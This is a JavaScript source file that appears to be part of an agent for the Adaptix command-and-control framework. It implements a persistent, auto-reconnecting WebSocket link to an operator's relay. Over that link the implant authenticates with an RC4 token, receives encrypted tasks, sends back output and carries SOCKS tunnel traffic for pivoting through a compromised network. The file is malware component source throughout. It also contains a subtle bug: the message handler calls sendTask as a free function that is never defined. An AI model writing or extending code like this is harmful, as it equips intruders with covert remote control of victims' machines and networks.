// wslink.js — persistent WebSocket "interactive session" channel (push-style).
//
// WHY: the HTTP beacon polls — every task/output costs a GET/POST pair, so
// interactive traffic (SOCKS pivoting, console) at sleep-speed is painful and
// noisy. This module keeps ONE TCP connection open to the relay and exchanges
// PUSHED binary frames — data only moves when there is data (see the Loki/
// c0rnbread-style "SOCKS5 over websockets (push style)" note).
//
// TRANSPORT: uses the platform WebSocket client (Node >= 22 / Electron main
// process expose `globalThis.WebSocket`). Zero dependencies — if the global is
// missing the link simply stays disabled and the HTTP beacon carries on.
//
// ENVELOPE (one WS binary message = one envelope):
//   [u8 type][payload]
//     0x54 'T' task channel    payload = nonce(8) || RC4(key||nonce, stream)
//                              S->A stream: LE task framing (TaskReader)
//                              A->S stream: BE output framing (OutPacker)
//     0x53 'S' tunnel frame    payload = [u16 connId][u8 code][data]
//                              (codes below — see socks.js)
//     0x50 'P' app keepalive   payload empty (both directions)
//     0x41 'A' hello C->S      payload = [u32 magic][u32 agent_id][auth]
//     0x57 'W' welcome S->C    payload empty
//
// AUTH: magic 0x41445054 ("ADPT"), then auth = RC4(key, "ADPTWS1" || u32le id)
// — relay recomputes and constant-compares. The WS key is independent of the
// HTTP session key (sidecar "ws": {"url", "key"} / ADAPTIX_WS_URL + ADAPTIX_WS_KEY).
//
// Per-frame nonce (8 random bytes) means no keystream reuse across frames —
// each frame is effectively RC4(key||nonce) with a fresh state.
const crypto = require('crypto');
const { rc4 } = require('./rc4');

const T_TASK = 0x54;
const T_TUN = 0x53;
const T_PING = 0x50;
const T_HELLO = 0x41;
const T_WELCOME = 0x57;
const HELLO_MAGIC = 0x41445054; // "ADPT"

// ---- per-frame crypto ------------------------------------------------------
function seal(key, data) {
  const nonce = crypto.randomBytes(8);
  const fk = Buffer.concat([key, nonce]);
  return Buffer.concat([nonce, rc4(data, fk)]);
}
function unseal(key, blob) {
  if (blob.length < 8) throw new Error('ws frame too short');
  const nonce = blob.slice(0, 8);
  return rc4(blob.slice(8), Buffer.concat([key, nonce]));
}
function authBlob(key, agentId) {
  // deterministic (NO nonce): the relay recomputes this and constant-compares
  return rc4(Buffer.concat([Buffer.from('ADPTWS1'), u32le(agentId)]), key);
}
function u32le(v) { const b = Buffer.alloc(4); b.writeUInt32LE(v >>> 0, 0); return b; }

// ---- link ------------------------------------------------------------------
// opts: { log, onTask(decStream), onTunnel(code, connId, data), onState(up) }
// returns { start, stop, sendTask, sendTunnel, ping, connected, buffered }
function createLink(wsCfg, opts) {
  const key = typeof wsCfg.key === 'string' ? Buffer.from(wsCfg.key, 'hex') : wsCfg.key;
  const agentId = wsCfg.agent_id >>> 0;
  let ws = null;
  let up = false;
  let stopped = false;
  let gen = 0;            // socket generation — invalidates stale callbacks
  let retryMs = 1000;
  let helloTimer = null;
  let pingTimer = null;
  let watchdogTimer = null;
  let lastRx = Date.now();
  let pendingTask = null; // task payload queued while the link is down

  const setState = (v) => { if (up !== v) { up = v; if (opts.onState) try { opts.onState(v); } catch (_) {} } };

  // per-ATTEMPT timer cleanup only (hello timeout). The keepalive timers
  // (ping + watchdog) are LINK-level — they must survive reconnect cycles:
  // clearing them on every failed attempt meant an agent that ever sat through
  // a relay-outage retry storm stopped pinging permanently once reconnected,
  // and the relay kept timing it out after 30 s.
  function clearTimers() {
    if (helloTimer) { clearTimeout(helloTimer); helloTimer = null; }
  }

  function rawSend(buf) {
    if (ws && ws.readyState === 1) { try { ws.send(buf); return true; } catch (_) { return false; } }
    return false;
  }
  function sendEnvelope(type, payload) {
    const p = payload || Buffer.alloc(0);
    const msg = Buffer.alloc(1 + p.length);
    msg[0] = type;
    p.copy(msg, 1);
    return rawSend(msg);
  }

  function onMessage(data) {
    lastRx = Date.now();
    let msg;
    try { msg = Buffer.isBuffer(data) ? data : Buffer.from(data); } catch (_) { return; }
    if (msg.length < 1) return;
    const type = msg[0];
    const body = msg.slice(1);
    if (type === T_WELCOME) {
      if (helloTimer) { clearTimeout(helloTimer); helloTimer = null; }
      retryMs = 1000;
      setState(true);
      opts.log('[ws] interactive channel UP — push mode');
      if (pendingTask) { // flush output queued while the link was down
        const t = pendingTask; pendingTask = null;
        sendTask(t);
      }
      return;
    }
    if (!up) return; // ignore everything until the relay welcomes us
    if (type === T_TASK) {
      try { const dec = unseal(key, body); if (opts.onTask && dec.length) opts.onTask(dec); }
      catch (e) { opts.log(`[-] ws task decrypt failed: ${e.message}`); }
      return;
    }
    if (type === T_TUN) {
      if (body.length < 3) return;
      const connId = body.readUInt16BE(0);
      const code = body[2];
      if (opts.onTunnel) try { opts.onTunnel(code, connId, body.slice(3)); } catch (_) {}
      return;
    }
    // T_PING and unknown types: already refreshed lastRx (watchdog food)
  }

  function connect() {
    if (stopped) return;
    if (typeof globalThis.WebSocket !== 'function') {
      opts.log('[-] no WebSocket client in this runtime — interactive channel disabled');
      stopped = true;
      return;
    }
    const myGen = ++gen;
    let sock;
    try { sock = new globalThis.WebSocket(wsCfg.url); }
    catch (e) { opts.log(`[-] ws connect error: ${e.message}`); schedule(); return; }
    ws = sock;
    try { sock.binaryType = 'arraybuffer'; } catch (_) {}

    sock.onopen = () => {
      if (myGen !== gen) return;
      // hello: magic + id + auth proof — relay answers with WELCOME
      const hello = Buffer.alloc(9);
      hello.writeUInt32BE(HELLO_MAGIC, 0);
      hello.writeUInt32LE(agentId, 4);
      hello[8] = 0x41;
      const auth = authBlob(key, agentId);
      sendEnvelope(T_HELLO, Buffer.concat([hello, auth]));
      helloTimer = setTimeout(() => { try { sock.close(); } catch (_) {} }, 6000);
    };
    sock.onmessage = (ev) => {
      if (myGen !== gen) return;
      let d = ev.data;
      if (d instanceof ArrayBuffer) d = Buffer.from(d);
      else if (ArrayBuffer.isView(d)) d = Buffer.from(d.buffer, d.byteOffset, d.byteLength);
      else if (typeof d === 'string') d = Buffer.from(d, 'binary');
      onMessage(d);
    };
    let attemptDone = false;
    const failover = () => {
      if (attemptDone || myGen !== gen) return;
      attemptDone = true;
      const wasUp = up;
      setState(false);
      clearTimers();
      opts.log(`[-] ws link down${wasUp ? ' (was up)' : ''} — retry in ${retryMs / 1000}s`);
      schedule();
    };
    sock.onclose = failover;
    // undici's WebSocket emits ONLY 'error' (no 'close') when the TCP connect
    // itself is refused — without this, the retry chain dies after one attempt
    sock.onerror = failover;
  }

  function schedule() {
    if (stopped) return;
    const delay = retryMs;
    retryMs = Math.min(retryMs * 2, 30000);
    setTimeout(connect, delay);
  }

  return {
    start(extra) {
      if (extra) Object.assign(opts, extra); // handlers may be supplied at start()
      stopped = false;
      connect();
      // app-level keepalive + lastRx watchdog (protocol pings are invisible to
      // the JS client — application pings keep NATs open and detect half-open)
      pingTimer = setInterval(() => sendEnvelope(T_PING), 10000);
      watchdogTimer = setInterval(() => {
        if (up && Date.now() - lastRx > 40000) {
          opts.log('[-] ws watchdog: no relay traffic — dropping link');
          try { if (ws) ws.close(); } catch (_) {}
        }
      }, 5000);
    },
    stop() {
      stopped = true;
      if (pingTimer) { clearInterval(pingTimer); pingTimer = null; }
      if (watchdogTimer) { clearInterval(watchdogTimer); watchdogTimer = null; }
      clearTimers();
      clearTimers();
      setState(false);
      try { if (ws) ws.close(); } catch (_) {}
    },
    // push an output stream (OutPacker.build() bytes) to the relay
    sendTask(plainBuf) {
      if (!up) { pendingTask = plainBuf; return false; } // keep the latest reply; flush on reconnect
      return sendEnvelope(T_TASK, seal(key, plainBuf));
    },
    sendTunnel(connId, code, data) {
      if (!up) return false;
      const body = Buffer.alloc(3 + (data ? data.length : 0));
      body.writeUInt16BE(connId & 0xffff, 0);
      body[2] = code;
      if (data) data.copy(body, 3);
      return sendEnvelope(T_TUN, body);
    },
    connected: () => up,
    buffered: () => { try { return ws && ws.bufferedAmount ? ws.bufferedAmount : 0; } catch (_) { return 0; } },
  };
}

module.exports = { createLink, seal, unseal, authBlob, T_TASK, T_TUN, T_PING, T_HELLO, T_WELCOME, HELLO_MAGIC };
